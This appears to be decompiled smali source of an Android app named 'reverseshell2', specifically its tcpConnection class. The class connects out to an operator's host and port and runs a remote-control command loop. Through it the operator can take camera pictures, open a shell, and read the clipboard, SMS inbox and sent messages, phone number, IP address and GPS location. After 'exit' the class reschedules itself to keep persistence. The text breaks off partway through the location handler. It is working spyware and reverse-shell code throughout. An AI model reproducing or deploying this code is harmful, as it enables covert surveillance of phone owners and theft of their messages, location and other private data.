.class public Lcom/example/reverseshell2/tcpConnection;
.super Landroid/os/AsyncTask;
.source "tcpConnection.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field activity:Landroid/app/Activity;

.field audioManager:Lcom/example/reverseshell2/Payloads/audioManager;

.field context:Landroid/content/Context;

.field functions:Lcom/example/reverseshell2/functions;

.field ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

.field locationManager:Lcom/example/reverseshell2/Payloads/locationManager;

.field private mPreview:Lcom/example/reverseshell2/Payloads/CameraPreview;

.field readCallLogs:Lcom/example/reverseshell2/Payloads/readCallLogs;

.field readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

.field shell:Lcom/example/reverseshell2/Payloads/newShell;

.field vibrate:Lcom/example/reverseshell2/Payloads/vibrate;

.field videoRecorder:Lcom/example/reverseshell2/Payloads/videoRecorder;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 43
    const-string v0, "tcpConnectionClass"

    sput-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Landroid/content/Context;)V
    .locals 1
    .param p1, "activity"    # Landroid/app/Activity;
    .param p2, "context"    # Landroid/content/Context;

    .line 52
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 39
    new-instance v0, Lcom/example/reverseshell2/Payloads/ipAddr;

    invoke-direct {v0}, Lcom/example/reverseshell2/Payloads/ipAddr;-><init>()V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

    .line 53
    iput-object p1, p0, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    .line 55
    iput-object p2, p0, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    .line 56
    new-instance v0, Lcom/example/reverseshell2/functions;

    invoke-direct {v0, p1}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    .line 57
    new-instance v0, Lcom/example/reverseshell2/Payloads/CameraPreview;

    invoke-direct {v0, p2}, Lcom/example/reverseshell2/Payloads/CameraPreview;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->mPreview:Lcom/example/reverseshell2/Payloads/CameraPreview;

    .line 58
    new-instance v0, Lcom/example/reverseshell2/Payloads/vibrate;

    invoke-direct {v0, p2}, Lcom/example/reverseshell2/Payloads/vibrate;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->vibrate:Lcom/example/reverseshell2/Payloads/vibrate;

    .line 59
    new-instance v0, Lcom/example/reverseshell2/Payloads/readSMS;

    invoke-direct {v0, p2}, Lcom/example/reverseshell2/Payloads/readSMS;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

    .line 60
    new-instance v0, Lcom/example/reverseshell2/Payloads/locationManager;

    invoke-direct {v0, p2, p1}, Lcom/example/reverseshell2/Payloads/locationManager;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->locationManager:Lcom/example/reverseshell2/Payloads/locationManager;

    .line 61
    new-instance v0, Lcom/example/reverseshell2/Payloads/audioManager;

    invoke-direct {v0, p2}, Lcom/example/reverseshell2/Payloads/audioManager;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->audioManager:Lcom/example/reverseshell2/Payloads/audioManager;

    .line 62
    new-instance v0, Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-direct {v0, p2, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->videoRecorder:Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 63
    new-instance v0, Lcom/example/reverseshell2/Payloads/readCallLogs;

    invoke-direct {v0, p2, p1}, Lcom/example/reverseshell2/Payloads/readCallLogs;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->readCallLogs:Lcom/example/reverseshell2/Payloads/readCallLogs;

    .line 64
    new-instance v0, Lcom/example/reverseshell2/Payloads/newShell;

    invoke-direct {v0, p1, p2}, Lcom/example/reverseshell2/Payloads/newShell;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->shell:Lcom/example/reverseshell2/Payloads/newShell;

    .line 65
    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 30
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/example/reverseshell2/tcpConnection;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/Void;
    .locals 19
    .param p1, "strings"    # [Ljava/lang/String;

    .line 69
    move-object/from16 v1, p0

    const-string v2, "sent"

    const-string v3, "inbox"

    const-string v4, "done"

    const-string v5, "called"

    const-string v6, "service_runner"

    const-string v7, "\n"

    const-string v8, "UTF-8"

    const/4 v0, 0x0

    move-object v9, v0

    .line 73
    .local v9, "socket":Ljava/net/Socket;
    :goto_0
    :try_start_0
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    const-string v12, "trying"

    invoke-static {v0, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 74
    new-instance v0, Ljava/net/Socket;

    invoke-direct {v0}, Ljava/net/Socket;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    move-object v9, v0

    .line 76
    const/4 v12, 0x1

    :try_start_1
    new-instance v0, Ljava/net/InetSocketAddress;

    const/4 v13, 0x0

    aget-object v13, p1, v13

    aget-object v14, p1, v12

    invoke-static {v14}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    invoke-direct {v0, v13, v14}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    const/16 v13, 0xbb8

    invoke-virtual {v9, v0, v13}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V
    :try_end_1
    .catch Ljava/net/SocketTimeoutException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    .line 87
    goto :goto_2

    .line 77
    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    .line 78
    .local v0, "e":Ljava/io/IOException;
    :goto_1
    :try_start_2
    sget-object v13, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    const-string v14, "error"

    invoke-static {v13, v14}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    iget-object v13, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v14, Lcom/example/reverseshell2/tcpConnection$1;

    invoke-direct {v14, v1}, Lcom/example/reverseshell2/tcpConnection$1;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v13, v14}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 88
    .end local v0    # "e":Ljava/io/IOException;
    :goto_2
    invoke-virtual {v9}, Ljava/net/Socket;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_1a

    .line 89
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    invoke-static {v0, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 90
    nop

    .line 93
    new-instance v0, Ljava/io/DataOutputStream;

    invoke-virtual {v9}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v13

    invoke-direct {v0, v13}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    move-object v13, v0

    .line 94
    .local v13, "out":Ljava/io/OutputStream;
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v14, Ljava/io/InputStreamReader;

    invoke-virtual {v9}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v14}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v14, v0

    .line 95
    .local v14, "in":Ljava/io/BufferedReader;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v15, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v15, v0

    .line 96
    .local v15, "model":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Hello there, welcome to reverse shell of "

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v10, v0

    .line 97
    .local v10, "welcomeMess":Ljava/lang/String;
    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    .line 99
    :goto_3
    invoke-virtual {v14}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v16, v0

    .local v16, "line":Ljava/lang/String;
    if-eqz v0, :cond_18

    .line 101
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    move-object/from16 v12, v16

    .end local v16    # "line":Ljava/lang/String;
    .local v12, "line":Ljava/lang/String;
    invoke-static {v0, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 102
    const-string v0, "exit"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 104
    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 105
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v11, Lcom/example/reverseshell2/tcpConnection$2;

    invoke-direct {v11, v1}, Lcom/example/reverseshell2/tcpConnection$2;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v0, v11}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 111
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v11, 0x15

    if-lt v0, v11, :cond_0

    .line 112
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v11, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v0, v11}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_4

    .line 114
    :cond_0
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v11, Lcom/example/reverseshell2/tcpConnection$3;

    invoke-direct {v11, v1}, Lcom/example/reverseshell2/tcpConnection$3;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v0, v11}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 121
    :goto_4
    invoke-virtual {v9}, Ljava/net/Socket;->close()V

    const/4 v12, 0x1

    goto :goto_3

    .line 123
    :cond_1
    const-string v0, "camList"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 125
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    invoke-virtual {v0}, Lcom/example/reverseshell2/functions;->get_numberOfCameras()Ljava/lang/String;

    move-result-object v0

    .line 126
    .local v0, "list":Ljava/lang/String;
    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/io/OutputStream;->write([B)V

    .line 127
    .end local v0    # "list":Ljava/lang/String;
    const/4 v12, 0x1

    goto :goto_3

    .line 128
    :cond_2
    const-string v0, "takepic \\d"

    invoke-virtual {v12, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    const-string v11, " "

    if-eqz v0, :cond_3

    .line 130
    :try_start_3
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    move-object/from16 v17, v10

    .end local v10    # "welcomeMess":Ljava/lang/String;
    .local v17, "welcomeMess":Ljava/lang/String;
    iget-object v10, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    invoke-virtual {v0, v10}, Lcom/example/reverseshell2/functions;->getScreenUp(Landroid/app/Activity;)V

    .line 131
    invoke-virtual {v12, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    move-object v10, v0

    .line 134
    .local v10, "cameraid":[Ljava/lang/String;
    :try_start_4
    const-string v0, "IMAGE\n"

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    .line 135
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->mPreview:Lcom/example/reverseshell2/Payloads/CameraPreview;

    const/4 v11, 0x1

    aget-object v18, v10, v11

    invoke-static/range {v18 .. v18}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v0, v11, v13}, Lcom/example/reverseshell2/Payloads/CameraPreview;->startUp(ILjava/io/OutputStream;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 141
    goto :goto_5

    .line 136
    :catch_2
    move-exception v0

    .line 138
    .local v0, "e":Ljava/lang/Exception;
    :try_start_5
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 139
    new-instance v11, Lcom/example/reverseshell2/jumper;

    move-object/from16 v18, v0

    .end local v0    # "e":Ljava/lang/Exception;
    .local v18, "e":Ljava/lang/Exception;
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-direct {v11, v0}, Lcom/example/reverseshell2/jumper;-><init>(Landroid/content/Context;)V

    invoke-virtual {v11}, Lcom/example/reverseshell2/jumper;->init()V

    .line 140
    invoke-static {v4, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 142
    .end local v10    # "cameraid":[Ljava/lang/String;
    .end local v18    # "e":Ljava/lang/Exception;
    :goto_5
    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 143
    .end local v17    # "welcomeMess":Ljava/lang/String;
    .local v10, "welcomeMess":Ljava/lang/String;
    :cond_3
    move-object/from16 v17, v10

    .end local v10    # "welcomeMess":Ljava/lang/String;
    .restart local v17    # "welcomeMess":Ljava/lang/String;
    const-string v0, "shell"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 145
    const-string v0, "SHELL"

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    .line 146
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->shell:Lcom/example/reverseshell2/Payloads/newShell;

    invoke-virtual {v0, v9, v13}, Lcom/example/reverseshell2/Payloads/newShell;->executeShell(Ljava/net/Socket;Ljava/io/OutputStream;)V

    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 148
    :cond_4
    const-string v0, "getClipData"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 150
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    invoke-virtual {v0}, Lcom/example/reverseshell2/functions;->readFromClipboard()Ljava/lang/String;

    move-result-object v0

    .line 151
    .local v0, "clipboard_data":Ljava/lang/String;
    if-eqz v0, :cond_5

    .line 153
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v0, v10

    .line 154
    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    goto :goto_6

    .line 158
    :cond_5
    const-string v10, "No Clipboard Data Present\n"

    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 160
    .end local v0    # "clipboard_data":Ljava/lang/String;
    :goto_6
    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 161
    :cond_6
    const-string v0, "deviceInfo"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 163
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    invoke-virtual {v0}, Lcom/example/reverseshell2/functions;->deviceInfo()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 165
    :cond_7
    const-string v0, "help"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 167
    const-string v0, "help\n"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 169
    :cond_8
    const-string v0, "clear"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 171
    const-string v0, "Hello there, welcome to reverse shell \n"

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 173
    :cond_9
    const-string v0, "getSimDetails"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 175
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v10, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v0, v10}, Lcom/example/reverseshell2/functions;->getPhoneNumber(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 176
    .local v0, "number":Ljava/lang/String;
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v0, v10

    .line 177
    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 178
    .end local v0    # "number":Ljava/lang/String;
    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 179
    :cond_a
    const-string v0, "getIP"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    .line 181
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Device Ip: "

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v1, Lcom/example/reverseshell2/tcpConnection;->ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

    const/4 v10, 0x1

    invoke-static {v10}, Lcom/example/reverseshell2/Payloads/ipAddr;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 182
    .local v0, "ip_addr":Ljava/lang/String;
    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 183
    .end local v0    # "ip_addr":Ljava/lang/String;
    move-object/from16 v10, v17

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 184
    :cond_b
    const-string v0, "vibrate \\d"

    invoke-virtual {v12, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 186
    invoke-virtual {v12, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 187
    .local v0, "numbers":[Ljava/lang/String;
    iget-object v10, v1, Lcom/example/reverseshell2/tcpConnection;->vibrate:Lcom/example/reverseshell2/Payloads/vibrate;

    const/4 v11, 0x1

    aget-object v18, v0, v11

    invoke-static/range {v18 .. v18}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v10, v11}, Lcom/example/reverseshell2/Payloads/vibrate;->vib(I)V

    .line 188
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "Vibrating "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v18, v4

    const/4 v11, 0x1

    aget-object v4, v0, v11

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " time successful.\n"

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 189
    .local v4, "res":Ljava/lang/String;
    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 190
    .end local v0    # "numbers":[Ljava/lang/String;
    .end local v4    # "res":Ljava/lang/String;
    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 191
    :cond_c
    move-object/from16 v18, v4

    const-string v0, "getSMS "

    invoke-virtual {v12, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    const-string v4, "END123\n"

    if-eqz v0, :cond_f

    .line 193
    :try_start_6
    invoke-virtual {v12, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 194
    .local v0, "box":[Ljava/lang/String;
    const/4 v10, 0x1

    aget-object v11, v0, v10

    invoke-virtual {v11, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_d

    .line 195
    const-string v10, "readSMS inbox\n"

    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 196
    iget-object v10, v1, Lcom/example/reverseshell2/tcpConnection;->readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

    invoke-virtual {v10, v3}, Lcom/example/reverseshell2/Payloads/readSMS;->readSMSBox(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 197
    .local v10, "sms":Ljava/lang/String;
    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/io/OutputStream;->write([B)V

    .line 198
    .end local v10    # "sms":Ljava/lang/String;
    goto :goto_7

    :cond_d
    const/4 v10, 0x1

    aget-object v11, v0, v10

    invoke-virtual {v11, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_e

    .line 199
    const-string v10, "readSMS sent\n"

    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 200
    iget-object v10, v1, Lcom/example/reverseshell2/tcpConnection;->readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

    invoke-virtual {v10, v2}, Lcom/example/reverseshell2/Payloads/readSMS;->readSMSBox(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 201
    .restart local v10    # "sms":Ljava/lang/String;
    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/io/OutputStream;->write([B)V

    .line 202
    .end local v10    # "sms":Ljava/lang/String;
    goto :goto_7

    .line 203
    :cond_e
    const-string v10, "readSMS null\n"

    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 204
    const-string v10, "Wrong Command\n"

    invoke-virtual {v10, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 206
    :goto_7
    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v13, v4}, Ljava/io/OutputStream;->write([B)V

    .line 207
    .end local v0    # "box":[Ljava/lang/String;
    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 208
    :cond_f
    const-string v0, "getLocation"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_10

    .line 210
    const-string v0, "getLocation\n"

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    .line 211
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->locationManager:Lcom/example/reverseshell2/Payloads/locationManager;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/locationManager;->getLocation()Ljava/lang/String;

    move-result-object v0

    .line 212
    .local v0, "res":Ljava/lang/String;
    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 213
